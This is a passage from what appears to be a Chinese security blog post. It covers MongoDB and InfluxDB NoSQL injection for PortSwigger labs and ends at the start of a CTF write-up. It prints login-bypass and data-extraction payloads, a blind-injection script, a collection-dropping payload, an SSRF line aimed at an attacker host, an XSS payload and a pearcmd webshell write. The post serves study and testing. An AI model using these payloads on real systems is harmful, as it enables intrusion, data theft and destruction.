MongoDB\\Driver\\Manager(\u0026#34;mongodb://127.0.0.1:27017\u0026#34;); $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $query = new MongoDB\\Driver\\Query(array( \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; $password )); $result = $manager-\u0026gt;executeQuery(\u0026#39;test.users\u0026#39;, $query)-\u0026gt;toArray(); $count = count($result); if ($count \u0026gt; 0) { foreach ($result as $user) { $user = ((array)$user); echo \u0026#39;====Login Success====\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;username:\u0026#39; . $user[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;password:\u0026#39; . $user[\u0026#39;password\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } } else{ echo \u0026#39;Login Failed\u0026#39;; } ?\u0026gt; 正常用户登录的时候\nusername=whoami\u0026amp;password=657260 其实执行的命令和我上面举的例子是一样的 如果这个时候传参\nusername[$ne]=1%password[$ne]=1 这样也可构造出一个true，也就是和我们sql注入中的万能密码admin\u0026rsquo; or 1=1\u0026ndash;+ 一个原理，就是构造永真条件\n运算符注入 #\rNoSQL 数据库经常使用查询运算符，它提供了指定数据必须满足的条件才能包含在查询结果中的方法。 MongoDB 查询运算符的示例包括：\n$where- 匹配满足 JavaScript 表达式的文档。 $ne- 匹配所有不等于指定值的值。 $in- 匹配数组中指定的所有值。 $regex- 选择值与指定正则表达式匹配的文档。 对于基于 URL 的输入，您可以通过 URL 参数插入查询运算符。例如，username=wiener变为 username[$ne]=invalid.如果这不起作用，您可以尝试以下操作：\n将请求方法从 转换GET为POST. 将Content-Type标题更改为application/json. 将 JSON 添加到消息正文。 在 JSON 中注入查询运算符。 进来有个login页面 抓个包看看 POST /login HTTP/1.1 Host: xxxxxxxxxxxxx.web-security-academy.net Cookie: session=djMoS9NuJRKCDsBfzRpHwzdkyy9EqZEC User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://xxxxxxxxxxx7.web-security-academy.net/login Content-Type: application/json Content-Length: 39 Origin: https://xxxxxxxxxxx.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;} 可以看见最后面传了json格式的文件 我们看见题目要求登录admin的账户，所以就构造playload playload： {\u0026ldquo;username\u0026rdquo;:{\u0026quot;$regex\u0026quot;:\u0026ldquo;admin.*\u0026rdquo;}, \u0026ldquo;password\u0026rdquo;:{\u0026quot;$ne\u0026quot;:\u0026quot;\u0026quot;}} 可以看见也是成功登录\n这里也吧M师傅的JavaScript注入的一些笔记写进来，因为算是同一个知识点了只不过师傅用的是where这个方法\nexample：\ndb.users.find({ $where: \u0026#34;function(){return(this.username == $userData)}\u0026#34; }) 构造延迟：\ndb.users.find({ $where: \u0026#34;function(){return(this.username == \u0026#39;a\u0026#39;; sleep(5000))}\u0026#34; }) MongoDB 2.4 之前 在 MongoDB 2.4 之前，通过 $where 操作符使用 map-reduce、group 命令可以访问到 Mongo Shell 中的全局函数和属性，如 db，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。\n如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：\nusername=1\u0026amp;password=1\u0026#39;;(function(){return(tojson(db.getCollectionNames()))})();var a=\u0026#39;1 MongoDB 2.4 之后 MongoDB 2.4 之后 db 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：\nusername=1\u0026amp;password=1\u0026#39;;return true// 或 username=1\u0026amp;password=1\u0026#39;;return true;var a=\u0026#39;1 也是可以查出所有信息的 DOS的一个playload：\nusername=1\u0026amp;password=1\u0026#39;;(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date\u0026lt;5000); return Math.max();})();var a=\u0026#39;1 也就是一直循环嘛\n联合查询注入 #\r假设后端的 MongoDB 查询语句使用了字符串拼接：\nstring query =\u0026#34;{ username: \u0026#39;\u0026#34; + $username + \u0026#34;\u0026#39;, password: \u0026#39;\u0026#34; + $password + \u0026#34;\u0026#39; }\u0026#34; 当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：\n{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;123456\u0026#39;} 如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：\nusername=admin\u0026#39;, $or: [ {}, {\u0026#39;a\u0026#39;: \u0026#39;a\u0026amp;password=\u0026#39; }], $comment: \u0026#39;123456 拼接入查询语句后相当于执行了：\n{ username: \u0026#39;admin\u0026#39;, $or: [ {}, {\u0026#39;a\u0026#39;:\u0026#39;a\u0026#39;, password: \u0026#39;\u0026#39; }], $comment: \u0026#39;123456\u0026#39;} 此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：\nselect * from logins where username = \u0026#39;admin\u0026#39; and (password true\u0026lt;\u0026gt; or (\u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and password = \u0026#39;\u0026#39;)) 这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 () 内的条件总是永真的。\n使用 Command 方法造成的注入 #\r懒了，这里也是直接贴出来\n\u0026lt;?php $manager = new MongoDB\\Driver\\Manager(\u0026#34;mongodb://127.0.0.1:27017\u0026#34;); $username = $_POST[\u0026#39;username\u0026#39;]; $cmd = new MongoDB\\Driver\\Command( [ \u0026#39;eval\u0026#39; =\u0026gt; \u0026#34;db.users.distinct(\u0026#39;username\u0026#39;,{\u0026#39;username\u0026#39;:\u0026#39;$username\u0026#39;})\u0026#34; ] ); $result = $manager-\u0026gt;executeCommand(\u0026#39;test.users\u0026#39;, $cmd)-\u0026gt;toArray(); $count = count($result); if ($count \u0026gt; 0) { foreach ($result as $user) { $user = ((array)$user); echo \u0026#39;====Login Success====\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;username:\u0026#39; . $user[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;password:\u0026#39; . $user[\u0026#39;password\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } } else{ echo \u0026#39;Login Failed\u0026#39;; } ?\u0026gt; playload:\nusername=1\u0026#39;});db.users.drop();db.user.find({\u0026#39;username\u0026#39;:\u0026#39;1 username=1\u0026#39;});db.users.insert({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:123456\u0026#34;});db.users.find({\u0026#39;username\u0026#39;:\u0026#39;1 盲注 #\r布尔盲注 #\rindex.php\n\u0026lt;?php $manager = new MongoDB\\Driver\\Manager(\u0026#34;mongodb://127.0.0.1:27017\u0026#34;); $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $query = new MongoDB\\Driver\\Query(array( \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; $password )); $result = $manager-\u0026gt;executeQuery(\u0026#39;test.users\u0026#39;, $query)-\u0026gt;toArray(); $count = count($result); if ($count \u0026gt; 0) { foreach ($result as $user) { $user = ((array)$user); echo \u0026#39;====Login Success====\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;username:\u0026#39; . $user[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;password:\u0026#39; . $user[\u0026#39;password\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } } else{ echo \u0026#39;Login Failed\u0026#39;; } ?\u0026gt; 判断playload：\nusername=admin\u0026amp;password[$regex]=.{number} 附上m师傅的盲注脚本\nimport requests import string password = \u0026#39;\u0026#39; url = \u0026#39;http://192.168.226.148/index.php\u0026#39; while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;]: # When the method is GET get_payload = \u0026#39;?username=admin\u0026amp;password[$regex]=^%s\u0026#39; % (password + c) # When the method is POST post_payload = { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password[$regex]\u0026#34;: \u0026#39;^\u0026#39; + password + c } # When the method is POST with JSON json_payload = \u0026#34;\u0026#34;\u0026#34;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;^%s\u0026#34;}}\u0026#34;\u0026#34;\u0026#34; % (password + c) #headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} #r = requests.post(url=url, headers=headers, data=json_payload) # 简单发送 json r = requests.post(url=url, data=post_payload) if \u0026#39;Login Success\u0026#39; in r.text: print(\u0026#34;[+] %s\u0026#34; % (password + c)) password += c # 输出如下: # [+] 1 # [+] 12 # [+] 123 # [+] 1234 # [+] 12345 # [+] 123456 时间盲注 #\r一些playload\n{\u0026#34;$where\u0026#34;: \u0026#34;sleep(5000)\u0026#34;} admin\u0026#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===\u0026#34;a\u0026#34;) \u0026amp;\u0026amp; waitTill \u0026gt; new Date()){};}(this)+\u0026#39; admin\u0026#39;+function(x){if(x.password[0]===\u0026#34;a\u0026#34;){sleep(5000)};}(this)+\u0026#39; portwigger-lab #\r利用NoSQL 注入提取数据 #\r首先进来还是利用之前给的号进入 发现有个lookup的文件进行搜索user： https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener 所以这里就尝试判断注入是否存在 playload： https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' \u0026amp;\u0026amp; \u0026lsquo;1\u0026rsquo;==\u0026lsquo;1 正常，所以判断是有注入的，那么这里如何获取数据呢？ 尽管题目给了admin的账户名，但是对于实战当中我们是没办法知道用户名的，所以我还是以winter这个account做例子 playload： https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' \u0026amp;\u0026amp; this.password.length \u0026lt; 30 || \u0026lsquo;a\u0026rsquo;=\u0026lsquo;b https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' \u0026amp;\u0026amp; this.password.length \u0026lt; 0 || \u0026lsquo;a\u0026rsquo;=\u0026lsquo;b 所以这里看见是可以对长度进行判断的，比如我们的密码是peter也就是5位那我们构造下length ==5也是为真的。 接下来可以利用\nwinter\u0026#39; \u0026amp;\u0026amp; this.password\\[0\\]=\\=\u0026#39;a 进行猜密码，这里可以写脚本也可以burp启动 这里就放出一些例子的图片，不多说明 识别字段名称 #\r由于 MongoDB 处理不需要固定架构的半结构化数据，因此您可能需要先识别集合中的有效字段，然后才能使用 JavaScript 注入提取数据。\n例如，要识别MongoDB数据库是否包含字段password，您可以提交以下有效负载：\nhttps://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d' 再次发送现有字段和不存在字段的有效负载。在此示例中，您知道该username字段存在，因此您可以发送以下有效负载：\nadmin\u0026#39; \u0026amp;\u0026amp; this.username!=\u0026#39; admin\u0026#39; \u0026amp;\u0026amp; this.foo!=\u0026#39; 如果该password字段存在，您会期望响应与现有字段 ( ) 的响应相同username，但与不存在字段 ( foo) 的响应不同。\n如果您想测试不同的字段名称，您可以通过使用单词列表循环不同的潜在字段名称来执行字典攻击。\n利用NoSQL运算符注入来提取数据 #\r假设有一个接受的程序：\n{\u0026#34;username\u0026#34;:\u0026#34;wiener\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;peter\u0026#34;} 要测试是否可以注入运算符，您可以尝试将$where运算符添加为附加参数，然后发送一个条件计算结果为 false 的请求，以及另一个计算结果为 true 的请求。例如：\n{\u0026#34;username\u0026#34;:\u0026#34;wiener\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;peter\u0026#34;, \u0026#34;$where\u0026#34;:\u0026#34;0\u0026#34;} {\u0026#34;username\u0026#34;:\u0026#34;wiener\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;peter\u0026#34;, \u0026#34;$where\u0026#34;:\u0026#34;1\u0026#34;} 如果存在差异，则存在注入 提取字段名称 #\r\u0026#34;$where\u0026#34;:\u0026#34;Object.keys(this)[0].match(\u0026#39;^.{0}a.*\u0026#39;)\u0026#34; 这将检查用户对象中的第一个数据字段并返回字段名称的第一个字符。这使您能够逐字符提取字段名称\nlab #\r首先说一下大概的思路，也就是利用前面的{$ne:\u0026rsquo;\u0026rsquo;}构造一个万能密码，会发现登录不了也就是（Account locked）需要reset password，这个时候我们直接利用语句\u0026quot;$where\u0026quot;:\u0026quot;Object.keys(this)[1].match('^.{}.*')\u0026quot;来获取json的名称，类似于\n{ \u0026#34;username\u0026#34;:\u0026#34;xxxxx\u0026#34; \u0026#34;password\u0026#34;:\u0026#34;xxxxxx\u0026#34; \u0026#34;forgetPWD\u0026#34;:\u0026#34;xxxxx\u0026#34; } 中的username,password，我们给对方的邮箱发送重置密码，然后利用上面的语句查出来我们需要的东西是在第几个key之中（其实就是判断他是否存在这个东西）例如这里的forgetpwd就是key\n\\[3\\]我们需要里面的值就可以再使用语句：\u0026quot;$where\u0026quot;:\u0026ldquo;this.forgetPWD.match(\u0026rsquo;^.{1}1.*\u0026rsquo;)\u0026ldquo;在数字一填入参数来进行爆破最终获取数据，因为我这里的lab响应太慢了我这里直接放一个视频链接可以去看看具体操作 : https://www.youtube.com/watch?v=fyOzoqd2hl4\njavascript运算符提取数据 #\r或者，您也可以使用无法运行 JavaScript 的运算符来提取数据。例如，您可以使用 $regex运算符逐字符提取数据。\n考虑一个易受攻击的应用程序，它接受请求正文中的用户名和密码POST。例如：\n{\u0026#34;username\u0026#34;:\u0026#34;myuser\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;mypass\u0026#34;} 您可以首先测试运算符是否$regex被处理，如下所示：\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;^.*\u0026#34;}} 如果对此请求的响应与您提交错误密码时收到的响应不同，则表明该应用程序可能存在漏洞。您可以使用$regex运算符逐字符提取数据。例如，以下有效负载检查密码是否以 开头 a：\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;^a*\u0026#34;}} 当然原理是一样的 以上的注入都是基于mangodb的语法，接下来是一种（权新版本）\nInfluxDB #\r在正式注入之前，我们先要了解一些关于influxdb必要的知识（主要是这个数据库确实比较冷门，但是不排除ctf会考）\n什么是InfluxDB #\rInfluxDB 是一种流行的开源时间序列数据库，旨在处理大量带时间戳的数据。InfluxDB 广泛用于监控和分析来自传感器、应用程序和物联网设备等各种来源的指标、事件和实时数据。\ninfluxDB的数据组织 #\rInfluxDB 数据模型将时间序列数据组织到存储桶和测量中。一个桶可以包含多个测量值。测量包含多个标签和字段。\nBucket：存储时间序列数据的指定位置。一个桶可以包含多个_测量值_。 测量：时间序列数据的逻辑分组。给定测量中的所有_点都应具有相同的__标签_。一个测量包含多个_标签_和_字段_。 Tags：键值对，其值不同，但不经常更改。标签用于存储每个点的元数据 - 例如，用于识别数据源（如主机、位置、站点等）的东西。 字段：键值对，其值随时间变化，例如：温度、压力、股票价格等。 Timestamp：与数据关联的时间戳。当存储在磁盘上并查询时，所有数据都按时间排序。 写入数据的一些操作 #\r首先，我们要知道——写入influxdb的数据都是通过一个叫做 line protocol（翻译叫做线路协议，感觉翻译的不是很好，所以就直接拿出来，以下简称:LP） 在官方文档中举了一个例子：\n// Syntax \u0026lt;measurement\u0026gt;[,\u0026lt;tag_key\u0026gt;=\u0026lt;tag_value\u0026gt;[,\u0026lt;tag_key\u0026gt;=\u0026lt;tag_value\u0026gt;]] \u0026lt;field_key\u0026gt;=\u0026lt;field_value\u0026gt;[,\u0026lt;field_key\u0026gt;=\u0026lt;field_value\u0026gt;] [\u0026lt;timestamp\u0026gt;] // Example myMeasurement,tag1=value1,tag2=value2 fieldKey=\u0026#34;fieldValue\u0026#34; 1556813561098000000 官方文档还提示到： Line protocol does not support the newline character \\n in tag or field values. 也就是\\n不支持转义为换行符，而是代表一个单独的point 关于这个协议的一些要素 measurement #\r必须存在，且每一个数据点仅接受一个measurement，并且遵循命名规则： Measurement names, tag keys, and field keys cannot begin with an underscore _. The _ namespace is reserved for InfluxDB system use. 它的数据类型为：string\nTag set #\r【不为必须，可选】该点的所有标签键值对。键值关系用=操作数表示。多个标签键值对以逗号分隔。 _标签键和标签值区分大小写。标签键受到命名限制。标签值不能为空；相反，从标签集中省略该标签。 数据类型：string\nField set #\r必须存在，和measurement一样，必须存在至少一个field，字段键和字符串值区分大小写，同样受到命名限制。 数据类型：对于键名：string 对于值：FLOAT INTEGER ULINTEGER STRING BOOLEAN\nexample(双引号表示filed的值):\nmeasurementName fieldKey=\u0026#34;field string value\u0026#34; 1556813561098000000 Timestamp #\r【可选择的】也就是我们常说的时间戳。InfluxDB 接受每个点一个时间戳。如果未提供时间戳，InfluxDB 将使用其主机的系统时间 (UTC)。 数据类型：Unix Timestamp\n关于时间戳的重要说明(from docs) #\r为了确保数据点包含观察指标的时间（未由 InfluxDB 接收），请包含时间戳。 如果您的时间戳不是纳秒，请在将数据写入 InfluxDB时指定时间戳的精度。 其他的一些东西 #\rQuotes(单引号) #\rElement Double quotes Single quotes Measurement Limited * Limited * Tag key Limited * Limited * Tag value Limited * Limited * Field key Limited * Limited * Field value Strings only Never Timestamp Never Never Special Characters(一些特殊的字符\\) #\r在以下情况下，需要使用反斜杠 ( \\) 转义某些字符\nElement Escape characters Measurement Comma, Space Tag key Comma, Equals Sign, Space Tag value Comma, Equals Sign, Space Field key Comma, Equals Sign, Space Field value Double quote, Backslash model of LP #\r关于这个LP，官方也给出了一个模型，可以用来构建一个LP\nmeasurement: home tags room: Living Room or Kitchen fields temp: temperature in °C (float) hum: percent humidity (float) co: carbon monoxide in parts per million (integer) timestamp: Unix timestamp in second precision 查询的操作 #\r两种查询语言：\nFlux：一种函数式脚本语言，旨在查询和处理来自 InfluxDB 和其他数据源的数据。 InfluxQL：一种类似 SQL 的查询语言，旨在从 InfluxDB 查询时间序列数据。 Flux语法 #\r基本格式 #\rfrom(bucket: \u0026#34;example-bucket\u0026#34;) |\u0026gt; range(start: -1d) |\u0026gt; filter(fn: (r) =\u0026gt; r._measurement == \u0026#34;example-measurement\u0026#34;) |\u0026gt; mean() |\u0026gt; yield(name: \u0026#34;_results\u0026#34;) from(): 从哪个bucket中查询 range(): 根据时间范围过滤数据。Flux 需要“有界”查询——仅限于特定时间范围的查询。 filter(): 根据列值过滤数据。每行由 表示r ，每列由 的属性表示r。可以使用多个过滤器. yield():输出。 mean():计算每个输入表的列中非空值的平均值_value Pipe-forward operator(管道转发符) #\rFlux 使用管道转发运算符 ( |\u0026gt;) 将一个函数的输出作为输入传递到下一个函数作为输入。 docs也是举了一个例子1: 以下 Flux 查询返回存储在家庭测量中的 co、hum和temp字段，其时间戳在 2022-01-01T08:00:00Z 和 2022-01-01T20:00:01Z 之间。\nfrom(bucket: \u0026#34;get-started\u0026#34;) |\u0026gt; range(start: 2022-01-01T08:00:00Z, stop: 2022-01-01T20:00:01Z) |\u0026gt; filter(fn: (r) =\u0026gt; r._measurement == \u0026#34;home\u0026#34;) |\u0026gt; filter(fn: (r) =\u0026gt; r._field== \u0026#34;co\u0026#34; or r._field == \u0026#34;hum\u0026#34; or r._field == \u0026#34;temp\u0026#34;) influxQL语法 #\rInfluxQL 是一种类 SQL 查询语言，与大多数 SQL 语言类似，但专门设计用于查询 InfluxDB 0.x 和 1.x 中的时间序列数据。\n基本的查询知识 #\rSELECT: 指定要查询的字段和标签。 FROM: 指定要查询的测量值。使用测量名称或包含数据库和保留策略的完全限定测量名称。例如：db.rp.measurement。 WHERE: (可选）根据字段、标签和时间过滤数据。 SELECT co,hum,temp,room FROM \u0026#34;get-started\u0026#34;.autogen.home WHERE time \u0026gt;= \u0026#39;2022-01-01T08:00:00Z\u0026#39; AND time \u0026lt;= \u0026#39;2022-01-01T20:00:00Z\u0026#39; 其实就和sql语句差不多.\n注入利用 #\r经过上面基础知识的学习，想必你已经有了一定的概念，那么我们就开始利用吧\n构建一个易被攻击的web #\rconst express = require(\u0026#39;express\u0026#39;); const {InfluxDB, Point} = require(\u0026#39;@influxdata/influxdb-client\u0026#39;) const app = express(); const token = \u0026#39;REDACTED\u0026#39; // InfluxDB Token const url = \u0026#39;https://127.0.0.1\u0026#39; // Local Database endpoint const org = \u0026#39;myOrg\u0026#39; const bucket = \u0026#39;publicBucket\u0026#39; const client = new InfluxDB({url, token}) async function query(fluxQuery) { results = [] queryApi = client.getQueryApi(org) for await (const {values, tableMeta} of queryApi.iterateRows(fluxQuery)) { o = tableMeta.toObject(values) console.log(o) results.push(o) } return results } app.get(\u0026#39;/query\u0026#39;, async (req, res) =\u0026gt; { try { const fluxQuery = \u0026#39;from(bucket:\u0026#34;\u0026#39; + bucket + \u0026#39;\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;public_field\u0026#34; and r._value == \u0026#34;\u0026#39; + req.query.data + \u0026#39;\u0026#34;) \u0026#39; result = await query(fluxQuery) res.send(result) } catch (err) { res.send(err.toString()) } }); const port = 3000; app.listen(port, () =\u0026gt; { console.log(`Server started on port ${port}`); }); 当我们只传入\u0026quot;的时候 发现了报错，也就是：\nconst fluxQuery = \u0026#39; from(bucket:\u0026#34;\u0026#39; + bucket + \u0026#39;\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;public_field\u0026#34; and r._value == \u0026#34;\u0026#39; + req.query.data + \u0026#39;\u0026#34;) \u0026#39; result = await query(fluxQuery) 这样的查询语句，其报错内容在 https://docs.influxdata.com/influxdb/v2.7/ 可以查找到，所以可以知道是influxdb的数据库\n构建一些playload #\r泄露bucket的名称 #\rplayload：\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) buckets() |\u0026gt; filter(fn: (r) =\u0026gt; r.name =~ /^a.*/ and die(msg:r.name)) // 该buckets()函数列出当前数据库中的所有存储桶。 该filter()函数使用r.name表达式来过滤存储桶名称，该名称r是存储桶查询的结果，并且name是函数中返回的字段buckets()。 如您所见，InfluxDB 查询支持正则表达式操作=~，因此条件背后的逻辑r.name =~ /^a.*/是，true如果存储桶名称以字母 开头，则为该条件a。 之后，过滤器使用一个and条件来调用函数，die()并将存储桶名称的值作为参数。该die()函数会抛出一个错误，并在第一个参数中传递自定义消息，这将泄漏存储桶名称。 有效负载也在yield()存储桶查询之前使用该函数。这是在 InfluxDB 上的单个请求中执行“多个查询”所必需的。 最后，有必要用yield()一个新行将 与存储桶查询分开，并且在有效负载的末尾，我在//另一个新行后面添加了表达式，以注释注入后的所有内容。 也就是如果数据库中存在以a开头的数据库名，他就会返回其name，如果没有的话就会返回null 当为a时： 当为p时： 可以看见返回了privateBucket这个bucket，这个地方可以用burp爆 exp.py:\nimport requests import string url = \u0026#34;https://127.0.0.1:3000?query=\u0026#34; para1= \u0026#34; \u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) buckets() |\u0026gt; filter(fn: (r) =\u0026gt; r.name =~ /^{}.*/ and die(msg:r.name)) //\u0026#34; s=\u0026#39;\u0026#39;+string.ascii_letters flag = sensitive_field for i in range(0,52): for j in s: try: htmlLen = requests.get(url=url+para1.format(j)).text except: print(j) if flag in htmlLen: print(htmlLen,endd=\u0026#39;\u0026#39;) break //为了让你们更加直观的看见playload，所以这里没有进行编码，所以可能在para1处会报错。 泄露bucket及其相关数据 #\r前面已经有bucket的名称了，所以就直接from\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;privateBucket\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; die(msg:r)) // 这里就是把filter中的r也就是匹配出来的所有东西都输出出来 最终页面返回：\n_value: B, _time: time, _stop: time, _start: time, _measurement: string, _field: string 也就是这个bucket中的所有的结构和其对应的数据类型，那么接下来便可以爆破其字段的名称\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;privateBucket\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field =~ /s.*/ and die(msg:r._field)) // 也就是爆破出以s开头的字段名称，这个和前面泄露bucket名的是一个原理 可以看见这个字段名为:sensitive_field 接下来就是爆其数据了\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;privateBucket\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;sensitive_field\u0026#34; and die(msg:string(v:r._value))) // 注意下这里的数据类型！！不然可能会报错(放出为int类型的时候，因为r.field默认为int类型)\nHttpError: runtime error @2:54-2:124: filter: type conflict: string != int 可以看见这里的值为1337\nSSRF利用 #\r在官方文档中，可以看见influxdb在from函数之中是可以接受host参数的 所以可以构造playload：\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;1337\u0026#34;, host:\u0026#34;https://ATTACKER-SERVER\u0026#34;) |\u0026gt; range(start:0) // XSS利用 #\r看见上面构建的程序\napp.get(\u0026#39;/query\u0026#39;, async (req, res) =\u0026gt; { try { const fluxQuery = \u0026#39;from(bucket:\u0026#34;\u0026#39; + bucket + \u0026#39;\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;public_field\u0026#34; and r._value == \u0026#34;\u0026#39; + req.query.data + \u0026#39;\u0026#34;) \u0026#39; result = await query(fluxQuery) res.send(result) } catch (err) { res.send(err.toString()) } }); 当 InfluxDB 查询中发生错误时，该try{ } catch{ }语句会将错误发送回客户端，并使用Content-Typeequals to text/html，允许浏览器加载 HTML 和 JavaScript。 这个时候我们就可以利用die函数在浏览器上执行xss\n\u0026#34;) die(msg:\u0026#34;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;\u0026#34;)// 参考文章： https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU2fDcYoEEOBrGYD#toc-8 https://portswigger.net/web-security/nosql-injection#exploiting-nosql-operator-injection-to-extract-data https://rafa.hashnode.dev/influxdb-nosql-injection#heading-influxdb-nosql-queries https://docs.influxdata.com/influxdb/v2/\n","date":"1 February 2024","externalUrl":null,"permalink":"/posts/nosql-inject/","section":"Posts","summary":"","title":"nosql-inject(mangodb and influxdb)","type":"posts"},{"content":"Eazy_include #\r首先进来先看一下源代码\n\u0026lt;?php function waf($path){ $path = str_replace(\u0026#34;.\u0026#34;,\u0026#34;\u0026#34;,$path); return preg_match(\u0026#34;/^[a-z]+/\u0026#34;,$path); } if(waf($_POST[1])){ include \u0026#34;file://\u0026#34;.$_POST[1]; } 可以看到这里是一个文件包含并且使用了file伪协议进行读传参的文件，但是这里设置了一个waf将，换为空（本来以为是要绕过这个玩意看了一堆特性），然后这里就可以牵扯到之前打ACTF2023时候的那个pearcmd，也就是包含一个pearcmd文件然后写入，可以写shell或者你可以直接把文件内容直接cp到另外一个文件里面（前提要有权限）。 首先包含, POST传参: 1=localhost/usr/local/lib/php/pearcmd.php 然后请求的地址： /?+config-create+/\u0026lt;?=@eval($_POST['2']);die();?\u0026gt;+/tmp/delete 也就是写进了一个小马进入当前目录shell.php下面 然后连一下 查看flag ctfshow{38472987-4228-48f8-9a35-cb46010b64c9}\nEazy_web #\r进来可以看见是一个反序列化\n开胃小菜，就让我成为签到题叭 \u0026lt;?php header(\u0026#39;Content-Type:text/html;charset=utf-8\u0026#39;); error_reporting(0); function waf1($Chu0){ foreach ($Chu0 as $name =\u0026gt; $value) { if(preg_match(\u0026#39;/[a-z]/i\u0026#39;, $value)){ exit(\u0026#34;waf1\u0026#34;); } } } function waf2($Chu0){ if(preg_match(\u0026#39;/show/i\u0026#39;, $Chu0)) exit(\u0026#34;waf2\u0026#34;); } function waf_in_waf_php($a){ $count = substr_count($a,\u0026#39;base64\u0026#39;); echo \u0026#34;hinthinthint,base64喔\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if($count!=1){ return True; } if (preg_match(\u0026#39;/ucs-2|phar|data|input|zip|flag|\\%/i\u0026#39;,$a)){ return True; }else{ return false; } } class ctf{ public $h1; public $h2; public function __wakeup(){ throw new Exception(\u0026#34;fastfast\u0026#34;); } public function __destruct() { $this-\u0026gt;h1-\u0026gt;nonono($this-\u0026gt;h2); } } class show{ public function __call($name,$args){ if(preg_match(\u0026#39;/ctf/i\u0026#39;,$args[0][0][2])){ echo \u0026#34;gogogo\u0026#34;; } } } class Chu0_write{ public $chu0; public $chu1; public $cmd; public function __construct(){ $this-\u0026gt;chu0 = 